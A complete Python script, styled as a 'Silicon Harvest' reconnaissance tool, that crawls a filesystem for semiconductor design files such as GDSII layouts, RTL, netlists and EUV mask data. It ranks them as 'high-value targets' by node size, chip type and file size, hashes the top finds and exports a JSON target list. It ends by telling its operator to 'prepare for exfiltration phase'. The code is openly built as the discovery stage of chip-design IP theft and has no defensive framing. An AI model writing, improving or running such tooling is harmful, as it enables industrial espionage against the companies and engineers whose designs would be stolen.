#!/usr/bin/env python3
"""
Chip Design Finder - Semiconductor Campaign Tool
Locates and catalogs chip design files, EDA projects, and semiconductor IP
"""

import os
import sys
import json
import hashlib
from pathlib import Path
from datetime import datetime

class ChipDesignFinder:
    """
    Searches for semiconductor design files including:
    - GDSII layout files
    - Verilog/VHDL RTL designs
    - SPICE netlists and simulation files
    - LEF/DEF physical design files
    - Design databases (Cadence, Synopsys, Mentor)
    - EUV mask data
    """

    # High-value design file extensions
    DESIGN_EXTENSIONS = {
        # Layout and physical design
        '.gds', '.gds2', '.gdsii', '.oas', '.oasis',
        # RTL and behavioral
        '.v', '.vh', '.sv', '.vhd', '.vhdl',
        # Netlist
        '.sp', '.spi', '.spice', '.cir',
        # Physical design
        '.lef', '.def', '.tlef',
        # Design databases
        '.db', '.cel', '.dbs', '.lib', '.nlib',
        # Constraint files
        '.sdc', '.upf', '.cpf',
        # Simulation
        '.fsdb', '.vcd', '.shm',
        # Cadence
        '.oa', '.cellview',
        # Synopsys
        '.db', '.ddc', '.svf',
        # Mask data
        '.jobdeck', '.rdb',
        # IP and standard cells
        '.lib', '.lef', '.gds',
    }

    # High-value directory patterns
    TARGET_DIRS = [
        'rtl', 'design', 'layout', 'gds', 'mask', 'tapeout',
        'physical', 'synthesis', 'pnr', 'drc', 'lvs',
        'ip', 'stdcell', 'analog', 'serdes', 'pll',
        'verification', 'testbench', 'libs',
        'cadence', 'synopsys', 'mentor', 'ansys',
        'process', 'technology', 'pdk',
    ]

    def __init__(self, search_root="/"):
        self.search_root = search_root
        self.findings = []
        self.stats = {
            'files_scanned': 0,
            'designs_found': 0,
            'total_size_bytes': 0,
            'high_value_targets': 0,
        }

    def calculate_file_hash(self, filepath, method='sha256'):
        """Calculate hash of file for tracking"""
        try:
            h = hashlib.new(method)
            with open(filepath, 'rb') as f:
                for chunk in iter(lambda: f.read(8192), b''):
                    h.update(chunk)
            return h.hexdigest()
        except:
            return None

    def assess_file_value(self, filepath, size):
        """Assign value score to design file"""
        score = 0
        filepath_lower = filepath.lower()

        # High-value indicators
        if any(x in filepath_lower for x in ['euv', 'mask', 'tapeout', '3nm', '2nm', '5nm']):
            score += 100
        if any(x in filepath_lower for x in ['cpu', 'gpu', 'ai', 'neural', 'tensor']):
            score += 80
        if '.gdsii' in filepath_lower or '.gds' in filepath_lower:
            score += 60
        if any(x in filepath_lower for x in ['serdes', 'pll', 'phy', 'analog']):
            score += 50
        if 'stdcell' in filepath_lower or 'ip' in filepath_lower:
            score += 40

        # Size factor (larger designs often more valuable)
        if size > 100 * 1024 * 1024:  # > 100MB
            score += 30
        elif size > 10 * 1024 * 1024:  # > 10MB
            score += 20

        return score

    def scan_for_designs(self, max_depth=10):
        """Scan filesystem for semiconductor design files"""
        print(f"[*] Starting chip design reconnaissance from {self.search_root}")
        print(f"[*] Targeting {len(self.DESIGN_EXTENSIONS)} file types")

        try:
            for root, dirs, files in os.walk(self.search_root):
                # Limit recursion depth
                depth = root[len(self.search_root):].count(os.sep)
                if depth > max_depth:
                    continue

                # Prioritize high-value directories
                dirs.sort(key=lambda d: any(x in d.lower() for x in self.TARGET_DIRS), reverse=True)

                for file in files:
                    self.stats['files_scanned'] += 1

                    # Check file extension
                    ext = Path(file).suffix.lower()
                    if ext not in self.DESIGN_EXTENSIONS:
                        continue

                    filepath = os.path.join(root, file)

                    try:
                        stat = os.stat(filepath)
                        size = stat.st_size

                        # Skip tiny files (likely not actual designs)
                        if size < 1024:  # < 1KB
                            continue

                        value_score = self.assess_file_value(filepath, size)

                        finding = {
                            'filepath': filepath,
                            'filename': file,
                            'extension': ext,
                            'size_bytes': size,
                            'size_mb': round(size / (1024*1024), 2),
                            'value_score': value_score,
                            'modified_time': datetime.fromtimestamp(stat.st_mtime).isoformat(),
                            'file_hash': self.calculate_file_hash(filepath) if value_score > 50 else None,
                        }

                        self.findings.append(finding)
                        self.stats['designs_found'] += 1
                        self.stats['total_size_bytes'] += size

                        if value_score >= 60:
                            self.stats['high_value_targets'] += 1
                            print(f"[!] HIGH VALUE: {filepath} (score: {value_score})")
                        elif value_score >= 40:
                            print(f"[+] Found: {filepath} (score: {value_score})")

                    except (PermissionError, FileNotFoundError):
                        continue

        except KeyboardInterrupt:
            print("\n[!] Scan interrupted by user")

        return self.generate_report()

    def generate_report(self):
        """Generate comprehensive findings report"""
        # Sort by value score
        self.findings.sort(key=lambda x: x['value_score'], reverse=True)

        report = {
            'scan_timestamp': datetime.now().isoformat(),
            'search_root': self.search_root,
            'statistics': {
                'files_scanned': self.stats['files_scanned'],
                'designs_found': self.stats['designs_found'],
                'high_value_targets': self.stats['high_value_targets'],
                'total_size_mb': round(self.stats['total_size_bytes'] / (1024*1024), 2),
                'total_size_gb': round(self.stats['total_size_bytes'] / (1024*1024*1024), 2),
            },
            'top_targets': self.findings[:50],  # Top 50 most valuable
            'all_findings': self.findings,
        }

        # Categorize by type
        by_type = {}
        for f in self.findings:
            ext = f['extension']
            if ext not in by_type:
                by_type[ext] = []
            by_type[ext].append(f)

        report['by_file_type'] = {
            ext: {
                'count': len(files),
                'total_size_mb': round(sum(f['size_bytes'] for f in files) / (1024*1024), 2),
                'files': files[:10]  # Top 10 per type
            }
            for ext, files in sorted(by_type.items(), key=lambda x: len(x[1]), reverse=True)
        }

        return report

    def export_report(self, output_file='chip_design_findings.json'):
        """Export findings to JSON file"""
        report = self.generate_report()

        with open(output_file, 'w') as f:
            json.dump(report, f, indent=2)

        print(f"\n[*] Report exported to {output_file}")
        print(f"[*] Files scanned: {report['statistics']['files_scanned']}")
        print(f"[*] Designs found: {report['statistics']['designs_found']}")
        print(f"[*] High-value targets: {report['statistics']['high_value_targets']}")
        print(f"[*] Total data: {report['statistics']['total_size_gb']} GB")

        return report


def main():
    """Main execution"""
    print("""
    ╔═══════════════════════════════════════════════╗
    ║   Chip Design Finder - Silicon Harvest       ║
    ║   Semiconductor IP Reconnaissance Tool        ║
    ╚═══════════════════════════════════════════════╝
    """)

    # Parse command line arguments
    search_root = sys.argv[1] if len(sys.argv) > 1 else "."
    output_file = sys.argv[2] if len(sys.argv) > 2 else "chip_design_findings.json"

    finder = ChipDesignFinder(search_root)
    report = finder.scan_for_designs()
    finder.export_report(output_file)

    print("\n[*] Reconnaissance complete. Prepare for exfiltration phase.")
    return report


if __name__ == "__main__":
    main()
